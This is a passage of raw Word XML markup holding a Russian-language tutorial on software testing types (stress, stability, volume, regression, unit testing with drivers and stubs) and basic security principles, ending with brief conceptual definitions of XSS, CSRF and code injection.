        <w:t>Stresstesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">) – тестирование работоспособности приложения при нагрузках, превышающих пользовательские в несколько раз. При стресс-тестировании (зачастую, только при нем) мы можем получить реальные данные границ производительности приложения, исследовать способность программы обрабатывать исключения, ее стабильность и </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>устойчивость. Именно в значительно увеличенной нагрузке на приложение и заключается разница между тестированием производительности и стресс тестированием.</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Тестирование стабильности или наработка на отказ (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Stability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Reliabilitytesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)  исследует</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> работоспособность приложения при длительной работе во времени, при нормальной для программы нагрузке.</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Объемное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>VolumeTesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) – тестирование проводится с увеличением не нагрузки и времени работы, а количества используемых данных, которые хранятся и используются в приложении.</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Очень часто при определении тестирования производительности и его типах приходят к ошибочному пониманию и путанице данных терминов. Чтобы избежать этого и закрепить полученные знания, подведем итог. Итак, тестирование производительности – это проверка таких нефункциональных требований, как производительность и работоспособность приложения при различных нагрузках и условиях. В зависимости от исследуемой характеристики программы, мы можем выделить такие типы тестирования как:</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Нагрузочное тестирование (производительность при нормальных условиях).</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Стресс-тестирование (работоспособность, производительность и характеристики приложения при экстремальных нагрузках).</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Тестирование стабильности (при длительной работе).</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Объемное тестирование (при увеличенных объемах обрабатываемых данных).</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Регрессионное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>regression</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xml:space="preserve">Регрессионное тестирование - это </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>вид тестирования</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> направленный на проверку изменений, сделанных в приложении или окружающей среде (починка дефекта, слияние кода, миграция на другую операционную систему, базу данных, веб сервер или сервер приложения), для подтверждения того факта, что существующая ранее функциональность работает как и прежде (см. </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>также Санитарное тестирование или проверка согласованности/исправности). Регрессионными могут быть как функциональные, так и нефункциональные тесты.</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Как правило, для регрессионного тестирования используются тест кейсы, написанные на ранних стадиях разработки и тестирования. Это дает гарантию того, что изменения в новой версии приложения не повредили уже существующую функциональность. Рекомендуется делать автоматизацию регрессионных тестов, для ускорения последующего процесса тестирования и обнаружения дефектов на ранних стадиях разработки программного обеспечения.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 xml:space="preserve">Сам по себе термин "Регрессионное тестирование", в зависимости от контекста использования может иметь разный смысл. Сэм </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Канер</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, к примеру, описал 3 основных типа регрессионного тестирования:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">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Регрессия багов (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Bug</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regression</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) - попытка доказать, что исправленная ошибка на самом деле не исправлена</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">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Регрессия старых багов (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Old</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bugs</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regression</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) - попытка доказать, что недавнее изменение кода или данных сломало исправление старых ошибок, т.е. старые баги стали снова воспроизводиться.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">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Регрессия побочного эффекта (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Side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effect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regression</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) - попытка доказать, что недавнее изменение кода или данных сломало другие части разрабатываемого приложения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Модульное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>unit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Модульное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Unit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 xml:space="preserve">) – тестирование каждой атомарной функциональности приложения отдельно, в искусственно созданной среде. Именно потребность в создании искусственной рабочей среды для определенного модуля, требует от </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>тестировщика</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> знаний в автоматизации тестирования программного обеспечения, некоторых навыков программирования. Данная среда для некоторого юнита создается с помощью драйверов и заглушек.</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ab/>
        <w:t>Каждая сложная программная система состоит из отдельных частей - модулей, выполняющих ту или иную функцию в составе системы. Для того, чтобы удостовериться в корректной работе всей системы, необходимо вначале протестировать каждый модуль системы по отдельности. В случае возникновения проблем при тестировании системы в целом это позволяет проще выявить модули, вызвавшие проблему, и устранить соответствующие дефекты в них. Такое тестирование модулей по отдельности получило называние модульного тестирования.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noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-RU"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41D6E943" wp14:editId="6CBF8E59">
            <wp:extent cx="4314825" cy="37623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4825" cy="3762375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>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Рис. (3) Визуально изображено модульное тестирование</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Драйвер – определенный модуль теста, который выполняют тестируемый нами элемент.</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Заглушка – часть программы, которая симулирует обмен данными с тестируемым компонентом, выполняет имитацию рабочей системы.</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Заглушки нужны для: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
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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Имитирования недостающих компонентов для работы данного элемента.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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Подачи или возвращения модулю определенного значения, возможность предоставить тестеру самому ввести нужное значение.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>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Воссоздания определенных ситуаций (исключения или другие нестандартные условия работы элемента).</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Преимущества модульного тестирования.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Прежде всего, нужно очертить рамки, в которых Юнит-тестирование оправданно. Во-первых, архитектура проекта должна быть спроектирована в соответствии с идеями ООП (четкое деление на классы, каждый из которых выполняет свою определенную функцию), что обеспечит систему грамотным делением на модули. Также, модульное тестирование должно быть менее затратным при поиске дефектов, чем другие виды тестов и должно снижать время отладки кода.</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Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>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Модульное тестирование мотивирует программистов писать код максимально оптимизированным, проводить </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>рефакторинг</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (упрощение кода программы, не затрагивая ее функциональность), так как с помощью Юнит-тестирования можно легко проверить работоспособность рассматриваемого компонента.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>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Необходимость отделения реализации от интерфейса (ввиду особенностей модульного тестирования), что позволяет минимизировать зависимости в системе.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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Документация Юнит-тестов может служить примером «живого документа» для каждого класса, тестируемого данным способом.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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Модульное тестирование помогает лучше понять роль каждого класса на фоне всей программной системы.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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Также, при «разработке через тестирование», которая активно используется в экстремальном программировании, модульное тестирования является одним из основных инструментов, позволяющий </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>разрабатывать модули в соответствии с требованиями к данному модулю.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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Естественно, получив реальный опыт работы инженером качества, Вы сможете совсем по-другому охарактеризовать данный вид тестирования. А пока, надеюсь, данная статья поможет Вам подойти на шаг ближе к возможности получения реального опыта.</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Тестирование безопасности (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>security</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Тестирование безопасности - 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Принципы безопасности программного обеспечения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Общая стратегия безопасности основывается на трех основных принципах:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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Конфиденциальность</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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Целостность</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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Доступность</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Конфиденциальность</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Конфиденциальность - это сокрытие определенных ресурсов или информации. Под конфиденциальностью можно понимать ограничение доступа к ресурсу некоторой категории пользователей, или другими словами, при каких условиях пользователь авторизован получить доступ к данному ресурсу.</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Целостность</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Существует два основных критерия при определении понятия целостности:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>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Доверие. Ожидается, что ресурс будет изменен только соответствующим способом определенной группой пользователей.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:num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Повреждение и восстановление. В </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>случае</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> когда данные повреждаются или неправильно меняются авторизованным или не авторизованным пользователем, вы должны определить на сколько важной является процедура восстановления данных.</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lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Доступность</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Доступность представляет собой требования о том, что ресурсы должны быть доступны авторизованному пользователю, внутреннему объекту или устройству. Как правило, чем более критичен </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ресурс</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> тем выше уровень доступности должен быть.</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Виды уязвимостей</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 настоящее время наиболее распространенными видами уязвимости в безопасности программного обеспечения являются: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XSS (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Cross-Site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Scripting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) - это вид уязвимости программного обеспечения (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> приложений), при которой, на генерированной сервером странице, выполняются вредоносные скрипты, с целью атаки клиента.</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XSRF / CSRF (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Request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Forgery</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">) - это вид уязвимости, позволяющий использовать недостатки HTTP протокола, при этом злоумышленники работают по следующей схеме: ссылка на вредоносный сайт </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>установливается</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> на странице, пользующейся доверием у пользователя, при переходе по вредоносной ссылке выполняется скрипт, сохраняющий личные данные пользователя (пароли, платежные данные и т.д.), либо отправляющий СПАМ сообщения от лица пользователя, либо изменяет доступ к учетной записи пользователя, для получения полного контроля над ней.</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Code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injections</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
